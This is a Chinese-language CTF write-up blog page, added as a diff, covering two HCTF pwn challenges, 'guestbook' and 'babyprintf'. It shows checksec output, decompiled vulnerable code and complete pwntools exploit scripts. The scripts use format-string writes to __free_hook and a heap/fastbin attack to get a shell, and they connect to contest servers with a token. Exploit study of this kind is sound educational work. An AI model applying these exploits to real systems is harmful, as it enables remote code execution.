@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="guestbook
+file guestbook
+ 1guestbook: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2,">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="greyd0g">
+    
+
+    <!-- Title -->
+    
+    <title>hctf_levle2 | welcome to my heart!</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="//cdn.bootcss.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Custom Fonts -->
+    <link href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href='//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+    <link href='//fonts.googleapis.com/css?family=Noto+Serif:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+</head>
+
+<body>
+
+    <!-- Content -->
+    <section class="article-container">
+<!-- Back Home -->
+<a class="nav-back" href="/">
+    <i class="fa fa-puzzle-piece"></i>
+</a>
+
+<!-- Page Header -->
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <h1>hctf_levle2</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Main Content -->
+            <div class="post-content col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <h1 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a>guestbook</h1><ul>
+<li><p>file guestbook</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">guestbook: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=798140e4e21252a80464305f38888d319890d5cd, stripped</div></pre></td></tr></table></figure>
+</li>
+<li><p>checksec guestbookl 开有pie， got表不可改。</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Arch:     i386-32-little</div><div class="line">RELRO:    Full RELRO</div><div class="line">Stack:    Canary found</div><div class="line">NX:       NX enabled</div><div class="line">PIE:      PIE enabled</div></pre></td></tr></table></figure>
+</li>
+<li><p>主要漏洞函数</p>
+<ul>
+<li><p>snprintf参数可控</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">      unsigned int see_E11()</div><div class="line">  &#123;</div><div class="line">    unsigned int v1; // [esp+8h] [ebp-110h]</div><div class="line">    char s[252]; // [esp+Ch] [ebp-10Ch]</div><div class="line">    unsigned int v3; // [esp+10Ch] [ebp-Ch]</div><div class="line"></div><div class="line">    v3 = __readgsdword(0x14u);</div><div class="line">    puts(&quot;Plz input the guest index:&quot;);</div><div class="line">    v1 = read_B40() % 0xAu;</div><div class="line">    if ( *(&amp;list_3040 + 10 * v1) )</div><div class="line">    &#123;</div><div class="line">      memset(s, 0, 0x100u);</div><div class="line">      strcpy(s, &quot;the name:&quot;);</div><div class="line">      snprintf(&amp;s[9], 0xF7u, &amp;list_3040 + 40 * v1 + 4);//列表中的内容为我们输入的内容</div><div class="line">      puts(s);</div><div class="line">      memset(s, 0, 0x100u);</div><div class="line">      strcpy(s, &quot;the phone:&quot;);</div><div class="line">      snprintf(&amp;s[10], 0xF6u, dword_3064[10 * v1]);</div><div class="line">      puts(s);</div><div class="line">    &#125;</div><div class="line">    else</div><div class="line">    &#123;</div><div class="line">      puts(&quot;Go away,hacker QAQ !&quot;);</div><div class="line">    &#125;</div><div class="line">    return __readgsdword(0x14u) ^ v3;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>漏洞利用(snprintf 可以将指针先输出到栈上)</p>
+<ul>
+<li>leak elf加载地址和libc加载地址。</li>
+<li>利用格式串逐位修改hook函数（malloc会在add时调用，所以选择__free_hook）。</li>
+<li>one_gadget不满足条件，需要使用system，因此需要将被free的指针改为/bin/sh的地址。</li>
+</ul>
+</li>
+<li><p>最终脚本</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># coding=utf-8</div><div class="line">from pwn import *</div><div class="line">#context.log_level = &apos;debug&apos;</div><div class="line">slocal =0</div><div class="line">if slocal:</div><div class="line">    p = process(&quot;./guestbook&quot;,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc&quot;&#125;)</div><div class="line">else:</div><div class="line">    p = remote(&apos;47.100.64.171&apos;,20002)# nc 47.100.64.171 20002</div><div class="line">    token = &apos;meLcB3PCrDZBAUsKkizIxLqVpU23NYgu&apos;</div><div class="line">    p.recvuntil(&apos;token&apos;)</div><div class="line">    p.sendline(token)</div><div class="line">def add(name,number):</div><div class="line">    p.recvuntil(&quot;your choice:&quot;)</div><div class="line">    p.sendline(&quot;1&quot;)</div><div class="line">    p.recvuntil(&quot;your name?&quot;)</div><div class="line">    p.sendline(name)</div><div class="line">    p.recvuntil(&quot;your phone?&quot;)</div><div class="line">    p.send(number)</div><div class="line">def dele(idx):</div><div class="line">    p.recvuntil(&quot;your choice:&quot;)</div><div class="line">    p.sendline(&quot;3&quot;)</div><div class="line">    p.recvuntil(&quot;index:&quot;)</div><div class="line">    p.sendline(str(idx))</div><div class="line"></div><div class="line">def see(idx):</div><div class="line">    p.recvuntil(&quot;your choice:&quot;)</div><div class="line">    p.sendline(&quot;2&quot;)</div><div class="line">    p.recvuntil(&quot;index:&quot;)</div><div class="line">    p.sendline(str(idx))    </div><div class="line">def pwn():</div><div class="line">    add(&apos;%p&apos;*3,&apos;1&apos;*16)    </div><div class="line">    see(0)</div><div class="line">    p.recvuntil(&apos;the name:&apos;)</div><div class="line">    elf = int(p.recvn(10),16)-0xe3a</div><div class="line">    log.info( &quot;elf address is &quot;+hex(elf))</div><div class="line">    libc = int(p.recvuntil(&apos;\n&apos;)[-11:-1],16 )- 0x1b2da7+0x2000</div><div class="line">    log.info(&quot;libc address is &quot;+hex(libc))</div><div class="line">    free_hook = 0x1b18b0+libc</div><div class="line">    malloc_hook = 0x1b0768+libc</div><div class="line">    one = libc+ 0x5f065</div><div class="line">    log.info(&quot;hook address is &quot;+hex(free_hook))</div><div class="line">    system =libc+0x3a940</div><div class="line">    log.info(&quot;one is&quot; + hex(one))</div><div class="line">    log.info( pidof(p))</div><div class="line">    raw_input()</div><div class="line">    #one = 0xdadebeef</div><div class="line">    bin_sh = libc + 0x15900b</div><div class="line">    one = p32(system)</div><div class="line">    aa = elf+0x3064</div><div class="line">    for x in xrange(4):</div><div class="line">        a = ord(one[x])</div><div class="line">        payload = &apos;sh;&apos;+p32(free_hook+x)+&apos;%&apos;</div><div class="line">        payload +=str(a-len(payload)+1)+&apos;c&apos;+&apos;%8$hhn&apos;</div><div class="line">        add(payload,&apos;1&apos;*16)</div><div class="line">        see(x+1)</div><div class="line">    print hex(bin_sh)</div><div class="line">    raw_input()</div><div class="line">    bi = p32(bin_sh)</div><div class="line">    for x in xrange(4):</div><div class="line">        a = ord(bi[x])</div><div class="line">        payload = &apos;AAA&apos;+p32(aa+x)+&apos;%&apos;</div><div class="line">        payload +=str(a-len(payload)+1)+&apos;c&apos;+&apos;%8$hhn&apos;</div><div class="line">        add(payload,&apos;1&apos;*16)</div><div class="line">        see(x+5)</div><div class="line">    p.recvuntil(&quot;choice:&quot;)</div><div class="line">    p.sendline(&apos;3&apos;)</div><div class="line">    p.sendline(&apos;0&apos;)</div><div class="line">    p.interactive()</div><div class="line">pwn()</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h1 id="babyprintf"><a href="#babyprintf" class="headerlink" title="babyprintf"></a>babyprintf</h1><ul>
+<li><p>file guestbook</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">babyprintf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5652f65b98094d8ab456eb0a54d37d9b09b4f3f6, stripped</div></pre></td></tr></table></figure>
+</li>
+<li><p>checksec guestbookl 开有 FORTIFY,格式串……</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Arch:     amd64-64-little</div><div class="line">RELRO:    Partial RELRO</div><div class="line">Stack:    Canary found</div><div class="line">NX:       NX enabled</div><div class="line">PIE:      No PIE (0x400000)</div><div class="line">FORTIFY:  Enabled</div></pre></td></tr></table></figure>
+</li>
+<li><p>主要函数</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">    void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</div><div class="line">&#123;</div><div class="line">  void *v3; // rbx</div><div class="line">  unsigned int v4; // eax</div><div class="line"></div><div class="line">  sub_400950();</div><div class="line">  while ( 1 )</div><div class="line">  &#123;</div><div class="line">    __printf_chk(1LL, &quot;size: &quot;);</div><div class="line">    v4 = sub_400990();</div><div class="line">    if ( v4 &gt; 0x1000 )</div><div class="line">      break;</div><div class="line">    v3 = malloc(v4);//申请任意大小的空间,没有free只有malloc</div><div class="line">    __printf_chk(1LL, &quot;string: &quot;);</div><div class="line">    gets(v3);//溢出...</div><div class="line">    __printf_chk(1LL, &quot;result: &quot;);</div><div class="line">    __printf_chk(1LL, v3);//可以用来leak</div><div class="line">  &#125;</div><div class="line">  puts(&quot;too long&quot;);</div><div class="line">  exit(1);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>利用sysmalloc的_int_free制作空控的空闲堆块（fastbin，smallbin不会）</p>
+<ul>
+<li>top_chunk 满足条件(不想看源码，直接看别人的总结)<ul>
+<li>1.大于MINSIZE(0X10)</li>
+<li>2.小于所需的大小 + MINSIZE</li>
+<li>3.prev inuse位设置为1</li>
+<li>4.old_top + oldsize要在一个页中</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>又是我不知道的新姿势（虽然有比赛有用到，然而我并没有认真研究过top_chunk）</li>
+<li><p>最后就是fastbin attack 这次one_gadget终于能用了</p>
+</li>
+<li><p>最终利用脚本</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># coding=utf-8</div><div class="line">from pwn import *</div><div class="line">context.log_level = &apos;debug&apos;</div><div class="line">slocal = 1</div><div class="line">if slocal==1:</div><div class="line">    p = process(&quot;./babyprintf&quot;)#,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.24.so&quot;&#125;)</div><div class="line">else:</div><div class="line">    p= remote(&quot;47.100.64.113&quot;,20001)#nc 47.100.64.113 20001</div><div class="line">    token = &apos;meLcB3PCrDZBAUsKkizIxLqVpU23NYgu&apos;</div><div class="line">    p.recvuntil(&apos;token&apos;)</div><div class="line">def add(size,con):</div><div class="line">    p.recvuntil(&quot;size: &quot;)</div><div class="line">    p.sendline(str(size))</div><div class="line">    p.recvuntil(&quot;string:&quot;)</div><div class="line">    p.sendline(con)</div><div class="line">libc = ELF(&quot;./libc-2.24.so&quot;)</div><div class="line">def pwn():</div><div class="line">    payload = &apos;%p&apos;*5+&apos;AAA&apos;+&apos;%p&apos;+&apos;BBB&apos;</div><div class="line">    add(0x1000,payload)</div><div class="line">    p.recvuntil(&quot;result: &quot;)</div><div class="line">    p.recvuntil(&quot;AAA&quot;)</div><div class="line">    data = p.recvuntil(&quot;BBB&quot;)[:-3]</div><div class="line">    libc.address =  int(data,16)-libc.symbols[&apos;__libc_start_main&apos;]</div><div class="line">    print &quot;libc address is &quot;+hex(libc.address)</div><div class="line">    raw_input()</div><div class="line">    for x in xrange(32):</div><div class="line">        add(0x1000,&apos;AAA&apos;)</div><div class="line">    #add(0xd10,&apos;AAAA&apos;)</div><div class="line">    fake_heap = 0x60101a</div><div class="line">    add(0x1000,&apos;B&apos;*0x1000+&apos;b&apos;*8+p64(0xde1))</div><div class="line">    add(0x500,&apos;aaa&apos;)</div><div class="line">    add(0x820,&apos;bb&apos;)</div><div class="line">    add(0x1000,&apos;DSDDDD&apos;)</div><div class="line">    add(0xa0,&apos;c&apos;*0xa8+p64(0xf41))</div><div class="line">    add(0x600,&apos;AAA&apos;)</div><div class="line">    add(0x8c0,&apos;bbbbb&apos;)</div><div class="line">    add(0x1000,&apos;FFF&apos;)</div><div class="line">    print pidof(p)</div><div class="line">    raw_input()</div><div class="line">    add(0x70,&apos;A&apos;*0x22000+&apos;B&apos;*8*7+p64(0x41)+p64(fake_heap))</div><div class="line">    add(0x30,&apos;aaa&apos;)</div><div class="line">    one = 0x4557a+libc.address</div><div class="line">    payload= &apos;/sh;AA&apos;+p64(one)*6</div><div class="line">    add(0x30,payload)</div><div class="line">    p.interactive()</div><div class="line">pwn()</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h1 id="强势膜杭电大师傅，比赛很好玩。"><a href="#强势膜杭电大师傅，比赛很好玩。" class="headerlink" title="强势膜杭电大师傅，比赛很好玩。"></a>强势膜杭电大师傅，比赛很好玩。</h1>
+ 
+                <!-- Meta -->
+                <div class="post-meta">
+                    <hr>
+                    <br>
+                    <div class="post-tags">
+                        
+                    </div>
+                    <div class="post-date">
+                        2017 年 11 月 12 日
+                    </div>
+                </div>
+            </div>
+
+            <!-- Comments -->
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <!-- Disqus Comments -->
+
+
+            </div>
+        </div>
+    </div>
+</article>
+</section>
+
+    <!-- Scripts -->
+    <!-- jQuery -->
+<script src="//cdn.bootcss.com/jquery/2.2.1/jquery.min.js"></script>
+<!-- Bootstrap -->
+<script src="//cdn.bootcss.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+
+<script type="text/javascript">
+	console.log('Hexo-theme-hollow designed by zchen9 🙋 © 2015-' + (new Date()).getFullYear());
+</script>
+
+    <!-- Google Analytics -->
+    
+
+</body>
+
+</html>
